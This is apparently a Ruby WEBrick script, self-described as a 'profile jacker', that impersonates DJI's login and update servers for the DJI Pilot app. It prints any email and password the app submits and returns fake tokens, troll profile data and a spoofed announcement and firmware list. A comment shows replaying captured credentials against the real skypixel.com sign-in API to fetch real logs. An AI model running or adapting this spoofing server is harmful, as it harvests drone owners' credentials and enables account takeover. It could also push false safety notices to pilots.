require 'webrick'
include WEBrick

s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null"), AccessLog: [] )
#s = HTTPServer.new( :Port => 80, Logger: WEBrick::Log.new("/dev/null") )

puts "DJI Pilot.app profile jacker has launched"

SIGN_IN_LOVE = '{"status":0,"status_msg":"ok","token":"thisisabullshittoken","avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg"}'

class SIGN_IN < HTTPServlet::AbstractServlet
 def do_POST(req, res)
   res.body = SIGN_IN_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a sign_in request with these credentials: #{req.body}"
# email=xxxxx&password=xxxxxx
#   username = 
#   password = 
# Test the password here, obtain *legit* token and download *real* logs?
#  wget --post-data "email=realuser%40gmail.com&password=realpass" https://www.skypixel.com/api/sign_in
 end
end

PROFILE_MY_LOVE = '{"status":0,"status_msg":"ok",' +
'"id":14963,"email":"realuser@gmail.com","show_name":"Troll Bagginz",' +
'"first_name":"Troll","last_name":"Bagginz","webpage":null,"country":"Deez Nuts",' +
'"country_code":"US","state":"Confusion ","city":"Trollville ","created_at":"1999-01-10T23:13:37.000Z",' +
'"bio":null,"about":null,"likes_count":0,"favorites_count":0,"photos_count":0,"videos_count":0,"gender":"male","account_type":null,' +
'"facebook_url":null,"pinterest_url":null,"tumblr_url":null,"twitter_url":null,' +
'"avatar":"http://rs1img.memecdn.com/dat-troll-meme-i-made-with-my-extreme-paint-skills_o_721540.jpg","active_info":[{"sn":"0123456789","deviceType":"1","productType":"inspire1",' +
'"email":"realuser@gmail.com","appVersion":"0.9.1","deviceName":"Monkey Dicks","activeday":"2015-01-30","ip":"1.2.3.4",' +
'"firmwareVersion":"01.13"}]}'

class PROFILES_MY < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = PROFILE_MY_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a profile view request for Profile Token: #{req.query_string}"
 end
end

#LOGOUT_JSON_LOVE = '{"status":315,"status_msg":"no member login!"}'
LOGOUT_JSON_LOVE = '{"status":0,"status_msg":"ok"}'

class LOGOUT_JSON < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = LOGOUT_JSON_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a logout request for Profile Token: #{req.query_string}"
 end
end

#o = [('a'..'z'), ('0'..'9')].map { |i| i.to_a }.flatten
o = [('0'..'9')].map { |i| i.to_a }.flatten
randtime = (0...10).map { o[rand(o.length)] }.join				
puts "rand time will be #{randtime}"
GETDAY_LOVE = '{"code":0,"data":"' + randtime + '"}'

class GETDAY < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = GETDAY_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a getday request #{req.query_string}"
 end
end

# THIS could be fun to announce funny stuff!!

LINKS_PLIOT_LOVE = '{"application":
    {
       "android":"1.0.1",
       "ios":"0.0.0"
    },
"announcement":
    {
        "guid":"23A20DCF-8410-2A07-23EE-175021762213",
        "en":"Propeller Locks\n\nThe Inspire 1â€™s propellers may come off during flight if they are not correctly hand tightened and environmental factors (including sand, heavy dust, or high winds) cause the motors slow down suddenly. To prevent this, DJI is offering free Propeller Locks to all Inspire 1 customers.\n\nIf you ordered your Inspire 1 from the DJI Online Store, they will automatically be shipped to you. If you purchased your Inspire 1 at an authorized DJI dealer, you can collect them there. These Propeller Locks will become available next week, and DJI recommends that you do not attempt flying your Inspire 1 before receiving and attaching the Propeller Locks."
    },
"versionlist":
    [
       {"date":"1421313854",
        "version":"1.2.0.16",
        "m0100":"01.03.19.93&0",
        "m0305":"34.01.00.05&1",
        "m0306":"01.15.04.09&1",
        "m0400":"01.05.00.61&0",
        "m0500":"02.03.06.00&0",
        "m0800":"01.10.00.14&0",
        "m0900":"01.03.06.03&0",
        "m1100":"03.00.00.11&0",
        "m1200":"01.03.00.60&0",
        "m1201":"01.03.00.60&0",
        "m1202":"01.03.00.60&0",
        "m1203":"01.03.00.60&0",
        "m1300":"01.03.00.00&0",
        "m1400":"01.03.00.06&0",
        "m1500":"01.01.01.00&0",
        "m1600":"01.03.00.00&0",
        "m1700":"01.00.02.04&0",
        "m1701":"01.00.00.09&0",
        "m1900":"01.00.08.03&0",
        "m2000":"01.00.08.03&0"},

       {"date":"1420454023",
        "version":"1.2.0.14",
        "m0100":"01.03.19.93&0",
        "m0305":"34.01.00.05&1",
        "m0306":"01.14.03.07&1",
        "m0400":"01.05.00.61&0",
        "m0500":"02.00.06.00&0",
        "m0800":"01.10.00.14&0",
        "m0900":"01.03.06.03&0",
        "m1100":"03.00.00.11&0",
        "m1200":"01.03.00.60&0",
        "m1201":"01.03.00.60&0",
        "m1202":"01.03.00.60&0",
        "m1203":"01.03.00.60&0",
        "m1300":"01.03.00.00&0",
        "m1400":"01.03.00.06&0",
        "m1500":"01.01.01.00&0",
        "m1600":"01.03.00.00&0",
        "m1700":"01.00.02.04&0",
        "m1701":"01.00.00.09&0",
        "m1900":"01.00.08.03&0",
        "m2000":"01.00.08.03&0"},

        {"date":"1420010415",
        "version":"1.2.0.13",
        "m0100":"01.03.19.93&0",
        "m0305":"34.01.00.05&1",
        "m0306":"01.13.02.00&1",
        "m0400":"01.01.00.54&0",
        "m0500":"02.00.06.00&0",
        "m0800":"01.10.00.14&0",
        "m0900":"01.03.06.03&0",
        "m1100":"03.00.00.11&0",
        "m1200":"01.02.00.59&0",
        "m1201":"01.02.00.59&0",
        "m1202":"01.02.00.59&0",
        "m1203":"01.02.00.59&0",
        "m1300":"01.03.00.00&0",
        "m1400":"01.03.00.06&0",
        "m1500":"01.01.01.00&0",
        "m1600":"01.03.00.00&0",
        "m1700":"01.00.02.04&0",
        "m1701":"01.00.00.09&0",
        "m1900":"01.00.08.03&0",
        "m2000":"01.00.08.03&0"},
	 
	    {"date":"1419177600",
        "version":"1.2.0.12",
        "m0100":"01.02.19.45&0",
        "m0305":"34.01.00.05&0",
        "m0306":"01.09.02.00&0",
        "m0400":"01.01.00.54&0",
        "m0500":"02.00.06.00&0",
        "m0800":"01.10.00.14&0",
        "m0900":"01.03.06.02&0",
        "m1100":"03.00.00.09&0",
        "m1200":"01.00.00.52&0",
        "m1201":"01.00.00.52&0",
        "m1202":"01.00.00.52&0",
        "m1203":"01.00.00.52&0",
        "m1300":"01.03.00.00&0",
        "m1400":"01.03.00.04&0",
        "m1500":"01.01.01.00&0",
        "m1600":"01.03.00.00&0",
        "m1700":"01.00.02.04&0",
        "m1701":"01.00.00.09&0",
        "m1900":"01.00.08.03&0",
        "m2000":"01.00.08.03&0"}
    ]
}'

class LINKS_PLIOT < HTTPServlet::AbstractServlet
 def do_GET(req, res)
   res.body = LINKS_PLIOT_LOVE
   res['Content-Type'] = "application/json; charset=utf-8"
   puts "DJI Pilot.app sent a getday request #{req.query_string}"
 end
end

# TODO
# 192.168.1.248 - - [01/Feb/2015:03:19:08 EST] "POST /api/sign_up HTTP/1.1" 404 282
# - -> /api/sign_up
# 192.168.1.248 - - [01/Feb/2015:03:19:25 EST] "GET /forget_password HTTP/1.1" 404 286
# - -> /forget_password
# 192.168.1.248 - - [01/Feb/2015:03:19:25 EST] "GET /favicon.ico HTTP/1.1" 404 282

trap("INT"){ s.shutdown }
s.mount("/api/sign_in", SIGN_IN)
s.mount("/api/profiles/my", PROFILES_MY)
s.mount("/api/logout.json", LOGOUT_JSON)
s.mount("/getday", GETDAY)
s.mount("/redirect/links/pliot", LINKS_PLIOT)

s.start

